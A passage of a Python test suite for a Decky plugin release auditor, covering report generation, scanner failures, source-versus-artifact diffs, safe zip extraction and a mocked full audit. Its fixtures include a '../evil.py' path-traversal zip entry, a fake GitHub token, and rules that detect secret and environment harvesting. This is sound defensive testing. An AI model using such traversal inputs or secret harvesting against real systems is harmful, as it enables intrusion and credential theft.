            "SECRET_PRIVATE_KEY_HEADER",
            "SECRET_PASSWORD_LITERAL",
            "SECRET_GENERIC_API_KEY",
        }
        findings = [
            ap.Finding(
                rule_id=rule_id,
                severity="critical",
                classification="BLOCK",
                path="fixture",
                line=1,
                message="fixture",
                evidence="",
                scanner="fixture",
            )
            for rule_id in block_rule_ids
        ]

        ap.apply_rule_classification_overrides(
            findings,
            self._policy({"PRIVILEGE_SUDO": "PASS_WITH_WARNINGS"}),
        )

        self.assertTrue(all(f.classification == "MANUAL_REVIEW" for f in findings))
        self.assertEqual(ap.classify_findings(findings)[0], "MANUAL_REVIEW")


# ---------------------------------------------------------------------------
# Report generation
# ---------------------------------------------------------------------------


class TestReportGeneration(unittest.TestCase):
    def _sample_report(self) -> ap.AuditReport:
        report = ap.AuditReport(
            audit_timestamp="2026-01-01T00:00:00Z",
            repository="https://github.com/owner/plugin",
            release="1.0.0",
            artifact_url="https://example.com/plugin.zip",
            artifact_sha256="a" * 64,
            plugin_name="TestPlugin",
            final_classification="PASS",
            risk_score=0,
        )
        report.findings = [
            ap.Finding(
                rule_id="EXEC_OS_SYSTEM",
                severity="high",
                classification="MANUAL_REVIEW",
                path="main.py",
                line=42,
                message="os.system() call",
                evidence="os.system('ls')",
                scanner="decky-static-rules",
            )
        ]
        return report

    def test_json_report_is_deterministic(self):
        report = self._sample_report()
        json1 = ap.generate_json_report(report)
        json2 = ap.generate_json_report(report)
        self.assertEqual(json1, json2)

    def test_json_report_is_valid_json(self):
        report = self._sample_report()
        data = json.loads(ap.generate_json_report(report))
        self.assertEqual(data["plugin_name"], "TestPlugin")
        self.assertIn("findings", data)

    def test_json_report_has_required_fields(self):
        report = self._sample_report()
        data = json.loads(ap.generate_json_report(report))
        for field in (
            "schema_version",
            "audit_timestamp",
            "repository",
            "artifact_sha256",
            "final_classification",
            "findings",
        ):
            self.assertIn(field, data, f"Missing field: {field}")

    def test_markdown_report_contains_classification(self):
        report = self._sample_report()
        report.final_classification = "BLOCK"
        md = ap.generate_markdown_report(report)
        self.assertIn("BLOCK", md)
        self.assertIn("TestPlugin", md)

    def test_markdown_redacts_secrets_in_evidence(self):
        report = self._sample_report()
        report.findings = [
            ap.Finding(
                rule_id="SECRET_GITHUB_TOKEN",
                severity="critical",
                classification="BLOCK",
                path="config.py",
                line=5,
                message="GitHub token detected",
                evidence=ap.SECRET_REDACT,
                scanner="secrets-scanner",
            )
        ]
        report.final_classification = "BLOCK"
        md = ap.generate_markdown_report(report)
        self.assertIn(ap.SECRET_REDACT, md)
        # Should not contain an actual token value
        self.assertNotIn("ghp_", md)

    def test_reports_disclose_generated_extensions_skipped_by_static_rules(self):
        report = self._sample_report()
        report.archive_stats = ap.ArchiveStats(
            static_scan_skipped_extensions={".json": 2, ".map": 1}
        )
        data = json.loads(ap.generate_json_report(report))
        self.assertEqual(
            data["archive_stats"]["static_scan_skipped_extensions"],
            {".json": 2, ".map": 1},
        )
        markdown = ap.generate_markdown_report(report)
        self.assertIn("Static source rules skipped", markdown)
        self.assertIn(".json: 2, .map: 1", markdown)

    def test_write_reports_produces_files(self):
        report = self._sample_report()
        with tempfile.TemporaryDirectory() as tmp:
            json_path, md_path = ap.write_reports([report], tmp)
            self.assertTrue(os.path.exists(json_path))
            self.assertTrue(os.path.exists(md_path))
            data = json.loads(Path(json_path).read_text())
            self.assertEqual(data["report_count"], 1)

    def test_run_summary_reports_classifications_and_top_rule_rates(self):
        reports = [
            ap.AuditReport(
                repository="one",
                final_classification="MANUAL_REVIEW",
                findings=[
                    ap.Finding(
                        rule_id="PRIVILEGE_SUDO",
                        severity="high",
                        classification="MANUAL_REVIEW",
                        path="one.py",
                        line=line,
                        message="sudo",
                        evidence="",
                        scanner="fixture",
                    )
                    for line in (1, 2)
                ],
            ),
            ap.AuditReport(
                repository="two",
                final_classification="PASS_WITH_WARNINGS",
                findings=[
                    ap.Finding(
                        rule_id="PRIVILEGE_SUDO",
                        severity="high",
                        classification="PASS_WITH_WARNINGS",
                        path="two.py",
                        line=1,
                        message="sudo",
                        evidence="",
                        scanner="fixture",
                    )
                ],
            ),
            ap.AuditReport(repository="three", final_classification="PASS"),
        ]

        summary = ap.generate_run_summary(reports)

        self.assertIn("Total releases audited: **3**", summary)
        self.assertIn("| MANUAL_REVIEW | 1 |", summary)
        self.assertIn("| PASS_WITH_WARNINGS | 1 |", summary)
        self.assertIn("| PASS | 1 |", summary)
        self.assertIn("| PRIVILEGE_SUDO | 2 | 66.67% |", summary)


# ---------------------------------------------------------------------------
# Scanner failure handling
# ---------------------------------------------------------------------------


class TestScannerFailure(unittest.TestCase):
    def test_unavailable_scanner_does_not_report_pass(self):
        """A scanner marked unavailable must not be treated as 'passed'."""
        status = ap.ScannerStatus(name="clamav", status="unavailable")
        self.assertNotEqual(status.status, "passed")

    def test_failed_scanner_recorded_as_failed(self):
        """When a scanner exits with an error, status must be 'failed', not 'passed'."""
        import subprocess as _subprocess

        with patch("shutil.which", return_value="/usr/bin/clamscan"):
            with patch("subprocess.run") as mock_run:
                mock_run.side_effect = _subprocess.TimeoutExpired(["clamscan"], 120)
                status, findings = ap.run_clamav("/tmp/fake", ap._default_policy())
        # Status must not be 'passed' when scanner errored
        self.assertNotEqual(status.status, "passed")

    def test_trivy_unavailable_returns_unavailable_status(self):
        with patch("shutil.which", return_value=None):
            status, findings = ap.run_trivy("/tmp/fake", ap._default_policy())
        self.assertEqual(status.status, "unavailable")
        self.assertEqual(findings, [])

    def test_semgrep_unavailable_returns_unavailable_status(self):
        # semgrep is disabled by default; use an enabled policy to test unavailability
        policy = ap._default_policy()
        policy["scanners"]["semgrep"] = {"enabled": True, "required": False}
        with patch("shutil.which", return_value=None):
            status, findings = ap.run_semgrep("/tmp/fake", policy)
        self.assertEqual(status.status, "unavailable")
        self.assertEqual(findings, [])


class TestSemgrepSeverityMapping(unittest.TestCase):
    def _policy(self) -> dict:
        p = ap._default_policy()
        p["scanners"]["semgrep"] = {"enabled": True, "required": False}
        return p

    def _run_with_severity(self, severity: str):
        payload = json.dumps(
            {
                "results": [
                    {
                        "check_id": "rule.id",
                        "path": "/tmp/fake/main.py",
                        "start": {"line": 3},
                        "extra": {"severity": severity, "message": "x", "lines": "x"},
                    }
                ]
            }
        )
        with (
            patch("shutil.which", return_value="/usr/bin/semgrep"),
            patch.object(ap, "_run_scanner", return_value=(True, payload, "")),
        ):
            return ap.run_semgrep("/tmp/fake", self._policy())

    def _run(self, stdout: str, ok: bool):
        with (
            patch("shutil.which", return_value="/usr/bin/semgrep"),
            patch.object(
                ap,
                "_run_scanner",
                return_value=(ok, stdout, "semgrep exited nonzero"),
            ),
        ):
            return ap.run_semgrep("/tmp/fake", self._policy())

    def test_valid_json_nonzero_exit_preserves_findings_but_fails(self):
        payload = json.dumps(
            {
                "results": [
                    {
                        "check_id": "rule.id",
                        "path": "/tmp/fake/main.py",
                        "start": {"line": 3},
                        "extra": {
                            "severity": "ERROR",
                            "message": "x",
                            "lines": "x",
                        },
                    }
                ]
            }
        )

        status, findings = self._run(payload, ok=False)

        self.assertEqual(status.status, "failed")
        self.assertEqual(len(findings), 1)

    def test_empty_output_nonzero_exit_fails(self):
        status, findings = self._run("", ok=False)

        self.assertEqual(status.status, "failed")
        self.assertEqual(findings, [])

    def test_valid_json_zero_exit_passes(self):
        status, findings = self._run(json.dumps({"results": []}), ok=True)

        self.assertEqual(status.status, "passed")
        self.assertEqual(findings, [])

    def test_uses_vendored_rules_without_registry_or_telemetry(self):
        calls = []

        def fake_run(args, name, timeout=120):
            calls.append((args, name, timeout))
            return True, json.dumps({"results": []}), ""

        with (
            patch("shutil.which", return_value="/usr/bin/semgrep"),
            patch.object(ap, "_run_scanner", side_effect=fake_run),
        ):
            status, findings = ap.run_semgrep("/tmp/fake", self._policy())

        self.assertEqual(status.status, "passed")
        self.assertEqual(findings, [])
        args = calls[0][0]
        self.assertNotIn("auto", args)
        self.assertIn("--metrics=off", args)
        self.assertIn("--disable-version-check", args)
        config_path = Path(args[args.index("--config") + 1])
        self.assertEqual(config_path.name, "semgrep-rules.yml")
        self.assertTrue(config_path.is_file())

    def test_error_maps_to_high_manual_review(self):
        status, findings = self._run_with_severity("ERROR")
        self.assertEqual(status.status, "found_issue")
        self.assertEqual(findings[0].severity, "high")
        self.assertEqual(findings[0].classification, "MANUAL_REVIEW")
        classification, _score = ap.classify_findings(findings)
        self.assertEqual(classification, "MANUAL_REVIEW")

    def test_warning_maps_to_medium_manual_review(self):
        _, findings = self._run_with_severity("WARNING")
        self.assertEqual(findings[0].severity, "medium")
        self.assertEqual(findings[0].classification, "MANUAL_REVIEW")

    def test_info_maps_to_info_pass_with_warnings(self):
        _, findings = self._run_with_severity("INFO")
        self.assertEqual(findings[0].severity, "info")
        self.assertEqual(findings[0].classification, "PASS_WITH_WARNINGS")

    def test_unknown_maps_conservatively(self):
        _, findings = self._run_with_severity("NOTICE")
        self.assertEqual(findings[0].severity, "high")
        self.assertEqual(findings[0].classification, "MANUAL_REVIEW")


class TestSourceArtifactDiff(unittest.TestCase):
    def _policy(self, required: bool = True, enabled: bool = True) -> dict:
        p = ap._default_policy()
        p["scanners"]["source_artifact_diff"] = {
            "enabled": enabled,
            "required": required,
        }
        p["scanners"]["semgrep"] = {"enabled": False, "required": False}
        return p

    def _mk_extract(
        self, files: dict[str, bytes | str], executable_paths: set[str] | None = None
    ) -> str:
        td = tempfile.TemporaryDirectory()
        executable_paths = executable_paths or set()
        for rel, content in files.items():
            p = Path(td.name) / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            if isinstance(content, str):
                content = content.encode("utf-8")
            p.write_bytes(content)
            if rel in executable_paths:
                p.chmod(p.stat().st_mode | stat.S_IXUSR)
        self.addCleanup(td.cleanup)
        return td.name

    def _patch_tree(self, *, tag_type: str = "commit", truncated: bool = False):
        def side_effect(url, params=None):
            if "/git/ref/tags/" in url:
                return {"object": {"type": tag_type, "sha": "sha-tag"}}
            if "/git/tags/" in url:
                return {"object": {"type": "commit", "sha": "sha-commit"}}
            if "/git/commits/" in url:
                return {"tree": {"sha": "sha-tree"}}
            if "/git/trees/" in url:
                return {
                    "truncated": truncated,
                    "tree": [{"path": "plugin/main.py"}],
                }
            raise AssertionError(f"Unexpected URL {url}")

        return patch.object(ap, "_gh_get", side_effect=side_effect)

    def test_zip_only_python_script(self):
        extract = self._mk_extract({"plugin/extra.py": "print('x')"})
        with self._patch_tree():
            summary, findings, status = ap.compare_source_and_artifact(
                extract, "o", "r", "v1"
            )
        self.assertEqual(status.status, "found_issue")
        self.assertIn("plugin/extra.py", summary["zip_only_scripts"])
        self.assertIn("ZIP_ONLY_SCRIPT", {f.rule_id for f in findings})

    def test_zip_only_shebang_script(self):
        extract = self._mk_extract({"plugin/run": "#!/bin/sh\necho ok\n"})
        with self._patch_tree():
            summary, findings, _ = ap.compare_source_and_artifact(
                extract, "o", "r", "v1"
            )
        self.assertIn("plugin/run", summary["zip_only_scripts"])
        self.assertIn("ZIP_ONLY_SCRIPT", {f.rule_id for f in findings})

    def test_zip_only_executable_text_file(self):
        extract = self._mk_extract(
            {"plugin/tool": "echo hi\n"}, executable_paths={"plugin/tool"}
        )
        with self._patch_tree():
            summary, findings, _ = ap.compare_source_and_artifact(
                extract, "o", "r", "v1"
            )
        self.assertIn("plugin/tool", summary["zip_only_scripts"])
        self.assertIn("ZIP_ONLY_SCRIPT", {f.rule_id for f in findings})

    def test_script_in_source_not_flagged(self):
        extract = self._mk_extract({"plugin/main.py": "print('x')"})
        with self._patch_tree():
            summary, findings, status = ap.compare_source_and_artifact(
                extract, "o", "r", "v1"
            )
        self.assertEqual(status.status, "passed")
        self.assertEqual(summary["zip_only_scripts"], [])
        self.assertFalse(any(f.rule_id == "ZIP_ONLY_SCRIPT" for f in findings))

    def test_modified_same_path_file_detected(self):
        source_data = b"print('original')"
        header = f"blob {len(source_data)}\x00".encode("ascii")
        source_sha = hashlib.sha1(header + source_data).hexdigest()

        extract = self._mk_extract({"plugin/main.py": "print('modified')"})

        def side_effect(url, params=None):
            if "/git/ref/tags/" in url:
                return {"object": {"type": "commit", "sha": "sha-commit"}}
            if "/git/commits/" in url:
                return {"tree": {"sha": "sha-tree"}}
            if "/git/trees/" in url:
                return {
                    "truncated": False,
                    "tree": [
                        {"path": "plugin/main.py", "type": "blob", "sha": source_sha}
                    ],
                }
            raise AssertionError(f"Unexpected URL {url}")

        with patch.object(ap, "_gh_get", side_effect=side_effect):
            summary, findings, status = ap.compare_source_and_artifact(
                extract, "o", "r", "v1"
            )
        self.assertEqual(status.status, "found_issue")
        self.assertIn("MODIFIED_SOURCE_FILE", {f.rule_id for f in findings})

    def _compare_metadata_files(
        self, source_files, artifact_files, ref="v1.0.1-dev.gabc"
    ):
        extract = self._mk_extract(
            {f"plugin/{path}": content for path, content in artifact_files.items()}
        )
        tree = []
        for path, content in source_files.items():
            source_raw = content if isinstance(content, bytes) else content.encode()
            tree.append(
                {
                    "path": path,
                    "type": "blob",
                    "sha": ap.git_blob_sha1(source_raw),
                }
            )

        def get_source(_owner, _repo, _ref, path):
            content = source_files.get(path)
            if content is None:
                return None
            return content if isinstance(content, bytes) else content.encode()

        with (
            patch.object(
                ap, "_resolve_ref_to_tree_sha", return_value=("sha-tree", None)
            ),
            patch.object(
                ap,
                "_gh_get",
                return_value={"truncated": False, "tree": tree},
            ),
            patch.object(ap, "get_repo_file_raw", side_effect=get_source),
        ):
            return ap.compare_source_and_artifact(extract, "o", "r", ref)

    def _build_stamp(self, path, source, artifact, version="1.0.1-dev.gabc"):
        return ap._metadata_diff_is_build_stamped(
            path,
            json.dumps(source).encode(),
            json.dumps(artifact).encode(),
            version,
        )

    def test_exact_package_version_build_stamp_is_allowed(self):
        self.assertTrue(
            self._build_stamp(
                "package.json",
                {"name": "plugin", "version": "1.0.0"},
                {"name": "plugin", "version": "1.0.1-dev.gabc"},
            )
        )

    def test_exact_debug_flag_removal_build_stamp_is_allowed(self):
        self.assertTrue(
            self._build_stamp(
                "plugin.json",
                {
                    "name": "Plugin",
                    "version": "1.0.1-dev.gabc",
                    "flags": ["debug", "root"],
                },
                {"name": "Plugin", "version": "1.0.1-dev.gabc", "flags": ["root"]},
            )
        )

    def test_exact_publish_image_build_stamp_is_allowed(self):
        self.assertTrue(
            self._build_stamp(
                "plugin.json",
                {
                    "name": "Plugin",
                    "version": "1.0.1-dev.gabc",
                    "publish": {
                        "image": "https://raw.githubusercontent.com/o/r/main/icon.png"
                    },
                },
                {
                    "name": "Plugin",
                    "version": "1.0.1-dev.gabc",
                    "publish": {
                        "image": "https://raw.githubusercontent.com/o/r/v1.0.1-dev.gabc/icon.png"
                    },
                },
            )
        )

    def test_arbitrary_version_build_stamp_is_rejected(self):
        self.assertFalse(
            self._build_stamp(
                "package.json",
                {"name": "plugin", "version": "1.0.0"},
                {"name": "plugin", "version": "999.0.0"},
            )
        )

    def test_combined_unrelated_build_drift_is_rejected(self):
        self.assertFalse(
            self._build_stamp(
                "plugin.json",
                {"name": "Plugin", "version": "1.0.0", "flags": ["debug"]},
                {"name": "Renamed", "version": "1.0.1-dev.gabc", "flags": []},
            )
        )

    def test_reordered_flags_build_stamp_is_rejected(self):
        self.assertFalse(
            self._build_stamp(
                "plugin.json",
                {
                    "name": "Plugin",
                    "version": "1.0.1-dev.gabc",
                    "flags": ["root", "debug", "network"],
                },
                {
                    "name": "Plugin",
                    "version": "1.0.1-dev.gabc",
                    "flags": ["network", "root"],
                },
            )
        )

    def test_near_match_publish_image_build_stamp_is_rejected(self):
        self.assertFalse(
            self._build_stamp(
                "plugin.json",
                {
                    "name": "Plugin",
                    "version": "1.0.1-dev.gabc",
                    "publish": {
                        "image": "https://raw.githubusercontent.com/o/r/mainly/icon.png"
                    },
                },
                {
                    "name": "Plugin",
                    "version": "1.0.1-dev.gabc",
                    "publish": {
                        "image": "https://raw.githubusercontent.com/o/r/v1.0.1-dev.gabc/icon.png"
                    },
                },
            )
        )

    def test_version_only_metadata_drift_is_allowed(self):
        source_files = {
            "plugin.json": json.dumps(
                {"name": "Syncthing", "version": "1.0.0", "flags": []}
            ),
            "package.json": json.dumps(
                {"name": "syncthing", "version": "1.0.0", "private": True}
            ),
        }
        artifact_files = {
            "plugin.json": json.dumps(
                {"name": "Syncthing", "version": "1.0.1-dev.gabc", "flags": []}
            ),
            "package.json": json.dumps(
                {
                    "name": "syncthing",
                    "version": "1.0.1-dev.gabc",
                    "private": True,
                }
            ),
        }
        summary, findings, status = self._compare_metadata_files(
            source_files, artifact_files
        )
        self.assertEqual(status.status, "passed")
        self.assertEqual(summary["modified_source_files"], [])
        self.assertNotIn("MODIFIED_SOURCE_FILE", {f.rule_id for f in findings})

    def test_decky_stamped_plugin_metadata_is_allowed(self):
        source = json.dumps(
            {
                "name": "Syncthing",
                "version": "1.0.0",
                "flags": ["debug"],
                "publish": {
                    "image": "https://raw.githubusercontent.com/o/r/main/assets/icon.png"
                },
            }
        )
        artifact = json.dumps(
            {
                "name": "Syncthing",
                "version": "1.0.1-dev.gabc",
                "flags": [],
                "publish": {
                    "image": "https://raw.githubusercontent.com/o/r/v1.0.1-dev.gabc/assets/icon.png"
                },
            }
        )
        summary, findings, status = self._compare_metadata_files(
            {"plugin.json": source}, {"plugin.json": artifact}
        )
        self.assertEqual(status.status, "passed")
        self.assertEqual(summary["modified_source_files"], [])
        self.assertNotIn("MODIFIED_SOURCE_FILE", {f.rule_id for f in findings})

    def test_plugin_flags_drift_is_not_allowed(self):
        source = json.dumps({"name": "Syncthing", "version": "1.0.0", "flags": []})
        artifact = json.dumps(
            {"name": "Syncthing", "version": "1.0.0", "flags": ["root"]}
        )
        summary, findings, status = self._compare_metadata_files(
            {"plugin.json": source}, {"plugin.json": artifact}
        )
        self.assertEqual(status.status, "found_issue")
        self.assertEqual(summary["modified_source_files"], ["plugin/plugin.json"])
        self.assertIn("MODIFIED_SOURCE_FILE", {f.rule_id for f in findings})

    def test_malformed_metadata_drift_is_not_allowed(self):
        source = json.dumps({"name": "Syncthing", "version": "1.0.0", "flags": []})
        summary, findings, status = self._compare_metadata_files(
            {"plugin.json": source}, {"plugin.json": "{not-json"}
        )
        self.assertEqual(status.status, "found_issue")
        self.assertEqual(summary["modified_source_files"], ["plugin/plugin.json"])
        self.assertIn("MODIFIED_SOURCE_FILE", {f.rule_id for f in findings})

    def test_shannon_entropy_removed(self):
        self.assertFalse(hasattr(ap, "_shannon_entropy"))

    def test_normal_plugin_compiled_assets_no_false_positives(self):
        extract = self._mk_extract(
            {
                "plugin/dist/index.js": "var a=1; /* minified bundle */",
                "plugin/dist/index.js.map": '{"version":3}',
                "plugin/assets/logo.png": b"\x89PNG\r\n\x1a\n",
                "plugin/main.py": "print('ok')",
            }
        )
        source_data = b"print('ok')"
        header = f"blob {len(source_data)}\x00".encode("ascii")
        source_sha = hashlib.sha1(header + source_data).hexdigest()

        def side_effect(url, params=None):
            if "/git/ref/tags/" in url:
                return {"object": {"type": "commit", "sha": "sha-commit"}}
            if "/git/commits/" in url:
                return {"tree": {"sha": "sha-tree"}}
            if "/git/trees/" in url:
                return {
                    "truncated": False,
                    "tree": [
                        {"path": "plugin/main.py", "type": "blob", "sha": source_sha}
                    ],
                }
            raise AssertionError(f"Unexpected URL {url}")

        with patch.object(ap, "_gh_get", side_effect=side_effect):
            summary, findings, status = ap.compare_source_and_artifact(
                extract, "o", "r", "v1"
            )
        self.assertEqual(status.status, "passed")
        self.assertEqual(summary["modified_source_files"], [])
        self.assertEqual(summary["zip_only_scripts"], [])
        self.assertEqual(findings, [])

    def test_native_binary_is_executable_not_script(self):
        extract = self._mk_extract({"plugin/helper": b"\x7fELF\x02\x01\x01\x00abc"})
        with self._patch_tree():
            summary, findings, _ = ap.compare_source_and_artifact(
                extract, "o", "r", "v1"
            )
        self.assertIn("plugin/helper", summary["zip_only_executables"])
        self.assertNotIn("plugin/helper", summary["zip_only_scripts"])
        self.assertIn("ZIP_ONLY_EXECUTABLE", {f.rule_id for f in findings})
        self.assertNotIn("ZIP_ONLY_SCRIPT", {f.rule_id for f in findings})

    def test_non_script_data_not_flagged(self):
        extract = self._mk_extract(
            {
                "plugin/data.json": '{"k":1}',
                "plugin/style.css": "body{}",
                "plugin/image.png": b"\x89PNG\r\n\x1a\n",
                "plugin/app.min.js": "var a=1;",
            }
        )
        with self._patch_tree():
            summary, findings, status = ap.compare_source_and_artifact(
                extract, "o", "r", "v1"
            )
        self.assertEqual(status.status, "passed")
        self.assertEqual(summary["zip_only_scripts"], [])
        self.assertEqual(findings, [])

    def test_lightweight_tag_resolution(self):
        extract = self._mk_extract({"plugin/main.py": "print('x')"})
        with self._patch_tree(tag_type="commit"):
            summary, _, status = ap.compare_source_and_artifact(
                extract, "o", "r", "v1.0.0"
            )
        self.assertTrue(summary["checked"])
        self.assertEqual(status.status, "passed")

    def test_annotated_tag_resolution(self):
        extract = self._mk_extract({"plugin/main.py": "print('x')"})
        with self._patch_tree(tag_type="tag"):
            summary, _, status = ap.compare_source_and_artifact(
                extract, "o", "r", "v1.0.0"
            )
        self.assertTrue(summary["checked"])
        self.assertEqual(status.status, "passed")

    def test_missing_tag_returns_failed_status(self):
        extract = self._mk_extract({"plugin/main.py": "print('x')"})
        with patch.object(
            ap,
            "_gh_get",
            side_effect=requests.HTTPError(response=MagicMock(status_code=404)),
        ):
            summary, _, status = ap.compare_source_and_artifact(
                extract, "o", "r", "missing-tag"
            )
        self.assertFalse(summary["checked"])
        self.assertEqual(status.status, "failed")

    def test_api_failure_returns_failed_status(self):
        extract = self._mk_extract({"plugin/main.py": "print('x')"})
        with patch.object(ap, "_gh_get", side_effect=RuntimeError("boom")):
            summary, _, status = ap.compare_source_and_artifact(extract, "o", "r", "v1")
        self.assertFalse(summary["checked"])
        self.assertEqual(status.status, "failed")

    def test_truncated_tree_is_failed(self):
        extract = self._mk_extract({"plugin/main.py": "print('x')"})
        with self._patch_tree(truncated=True):
            summary, _, status = ap.compare_source_and_artifact(extract, "o", "r", "v1")
        self.assertFalse(summary["checked"])
        self.assertEqual(status.status, "failed")

    def test_required_failure_becomes_audit_error(self):
        policy = self._policy(required=True, enabled=True)
        statuses = [ap.ScannerStatus(name="source-artifact-diff", status="failed")]
        cls, _ = ap.classify_findings([], scanner_statuses=statuses, policy=policy)
        self.assertEqual(cls, "AUDIT_ERROR")

    def test_optional_failure_becomes_pass_with_warnings(self):
        policy = self._policy(required=False, enabled=True)
        findings = [
            ap.Finding(
                rule_id="SOURCE_ARTIFACT_DIFF_INCOMPLETE",
                severity="low",
                classification="PASS_WITH_WARNINGS",
                path="",
                line=0,
                message="incomplete",
                evidence="",
                scanner="source-artifact-diff",
            )
        ]
        statuses = [ap.ScannerStatus(name="source-artifact-diff", status="failed")]
        cls, _ = ap.classify_findings(
            findings, scanner_statuses=statuses, policy=policy
        )
        self.assertEqual(cls, "PASS_WITH_WARNINGS")


# ---------------------------------------------------------------------------
# Safe extraction
# ---------------------------------------------------------------------------


class TestSafeExtraction(unittest.TestCase):
    def test_safe_extraction_succeeds(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("plugin/main.py", "print('hello')")
        zip_path = _make_temp_zip(buf.getvalue())
        try:
            with tempfile.TemporaryDirectory() as dest:
                extracted = ap.safe_extract_zip(zip_path, dest)
                self.assertIn("plugin/main.py", extracted)
        finally:
            os.unlink(zip_path)

    def test_extraction_blocks_traversal(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("../evil.py", "bad")
        zip_path = _make_temp_zip(buf.getvalue())
        try:
            with tempfile.TemporaryDirectory() as dest:
                with self.assertRaises(ValueError):
                    ap.safe_extract_zip(zip_path, dest)
        finally:
            os.unlink(zip_path)


# ---------------------------------------------------------------------------
# End-to-end audit (mocked network)
# ---------------------------------------------------------------------------


class TestAuditRepositoryMocked(unittest.TestCase):
    """Smoke tests for audit_repository with all network calls mocked."""

    def setUp(self):
        self.resolve_patcher = patch.object(
            ap,
            "_resolve_ref_to_commit_and_tree_sha",
            return_value=("commit123", "tree123", None),
        )
        self.resolve_patcher.start()

    def tearDown(self):
        self.resolve_patcher.stop()

    def _make_simple_zip(self) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr(
                "my-plugin/plugin.json",
                json.dumps({"name": "MyPlugin", "flags": []}),
            )
            zf.writestr("my-plugin/main.py", "# hello world\n")
        return buf.getvalue()

    def _make_zip_with_metadata(
        self, plugin_name: str | None, package_name: str | None
    ) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            if plugin_name is not None:
                zf.writestr(
                    "my-plugin/plugin.json",
                    json.dumps({"name": plugin_name, "flags": []}),
                )
            if package_name is not None:
                zf.writestr(
                    "my-plugin/package.json", json.dumps({"name": package_name})
                )
            zf.writestr("my-plugin/main.py", "# hello world\n")
        return buf.getvalue()

    def _run_scanner_precision_fixture(self, plugin_flags=None):
        plugin_flags = [] if plugin_flags is None else plugin_flags
        token = "ghp_" + "A" * 36
        source_files = {
            "plugin.json": json.dumps(
                {
                    "name": "Syncthing",
                    "version": "1.0.0",
                    "flags": plugin_flags,
                }
            ).encode(),
            "package.json": json.dumps(
                {"name": "syncthing", "version": "1.0.0", "private": True}
            ).encode(),
            "main.py": (
                'import os\nimport subprocess\napi_key = os.environ.get("SYNCTHING_API_KEY")\n'
                'subprocess.run(["true"])\n'
            ).encode(),
        }
        artifact_files = {
            "syncthing/plugin.json": json.dumps(
                {
                    "name": "Syncthing",
                    "version": "1.0.1-dev.gabc",
                    "flags": plugin_flags,
                }
            ),
            "syncthing/package.json": json.dumps(
                {
                    "name": "syncthing",
                    "version": "1.0.1-dev.gabc",
                    "private": True,
                }
            ),
            "syncthing/main.py": source_files["main.py"],
            "syncthing/dist/index.js.map": json.dumps(
                {
                    "version": 3,
                    "sources": ["/home/deck/mount/build/src/index.ts"],
                    "token": token,
                }
            ),
        }
        zip_data = _make_zip(
            [_regular(path, content) for path, content in artifact_files.items()]
        )
        release = {
            "tag_name": "v1.0.1-dev.gabc",
            "prerelease": True,
            "assets": [
                {
                    "name": "syncthing.zip",
                    "id": 1,
                    "browser_download_url": "https://example.com/syncthing.zip",
                }
            ],
        }
        tree = [
            {
                "path": path,
                "type": "blob",
                "sha": ap.git_blob_sha1(content),
            }
            for path, content in source_files.items()
        ]

        def fake_download(_url, dest_path, policy=None):
            del policy
            Path(dest_path).write_bytes(zip_data)
            return hashlib.sha256(zip_data).hexdigest()

        def fake_get_repo_file_raw(_owner, _repo, _ref, path):
            return source_files.get(path)

        with (
            patch.object(
                ap,
                "get_repo_metadata",
                return_value={"default_branch": "main", "archived": False},
            ),
            patch.object(ap, "get_releases", return_value=[release]),
            patch.object(ap, "get_repo_file_raw", side_effect=fake_get_repo_file_raw),
            patch.object(ap, "download_zip", side_effect=fake_download),
            patch.object(
                ap,
                "run_clamav",
                return_value=(ap.ScannerStatus(name="clamav", status="passed"), []),
            ),
            patch.object(
                ap,
                "run_trivy",
                return_value=(ap.ScannerStatus(name="trivy", status="passed"), []),
            ),
            patch.object(
                ap,
                "run_semgrep",
                return_value=(ap.ScannerStatus(name="semgrep", status="skipped"), []),
            ),
            patch.object(
                ap,
                "_gh_get",
                return_value={"truncated": False, "tree": tree},
            ),
        ):
            return ap.audit_repository(
                "https://github.com/owner/syncthing",
                policy=ap._default_policy(),
                exceptions=[],
                skip_cache=True,
            )

    def test_scanner_precision_fixture_keeps_only_intended_survivors(self):
        report = self._run_scanner_precision_fixture()
        rule_ids = [finding.rule_id for finding in report.findings]
        self.assertEqual(
            rule_ids,
            [
                "SENSITIVE_ENV_HARVEST",
                "EXEC_SUBPROCESS_RUN",
                "SECRET_GITHUB_TOKEN",
            ],
        )
        self.assertNotIn("PRIVILEGE_MOUNT", rule_ids)
        self.assertNotIn("MODIFIED_SOURCE_FILE", rule_ids)
        env_finding = next(
            finding
            for finding in report.findings
            if finding.rule_id == "SENSITIVE_ENV_HARVEST"
        )
        self.assertEqual(env_finding.classification, "PASS_WITH_WARNINGS")
        secret_finding = next(
            finding
            for finding in report.findings
            if finding.rule_id == "SECRET_GITHUB_TOKEN"
        )
        self.assertEqual(secret_finding.classification, "MANUAL_REVIEW")
        self.assertEqual(report.final_classification, "MANUAL_REVIEW")
        self.assertEqual(report.plugin_name, "Syncthing")
        self.assertEqual(
            report.archive_stats.static_scan_skipped_extensions,
            {".json": 2, ".map": 1},
        )

    def test_generated_json_skip_does_not_bypass_metadata_checks(self):
        report = self._run_scanner_precision_fixture(plugin_flags=["root"])
        self.assertIn("ROOT_ACCESS", {finding.rule_id for finding in report.findings})

    def test_clean_plugin_passes(self):
        zip_data = self._make_simple_zip()

        meta = {
            "default_branch": "main",
            "archived": False,
            "description": "A test plugin",
        }
        release = {
            "tag_name": "v1.0.0",
            "prerelease": False,
            "assets": [
                {
                    "name": "my-plugin.zip",
                    "id": 1,
                    "browser_download_url": "https://example.com/my-plugin.zip",
                }
            ],
        }

        _ok_clamav = (ap.ScannerStatus(name="clamav", status="passed"), [])
        _ok_trivy = (ap.ScannerStatus(name="trivy", status="passed"), [])

        # We need a real temp file for inspect_zip; write the ZIP there
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tf:
            tf.write(zip_data)
            tf_path = tf.name
        try:
            import hashlib

            def fake_download(url, dest_path, policy=None):
                del url, policy
                Path(dest_path).write_bytes(zip_data)
                sha = hashlib.sha256(zip_data).hexdigest()
                return sha

            with (
                patch.object(ap, "get_repo_metadata", return_value=meta),
                patch.object(ap, "get_releases", return_value=[release]),
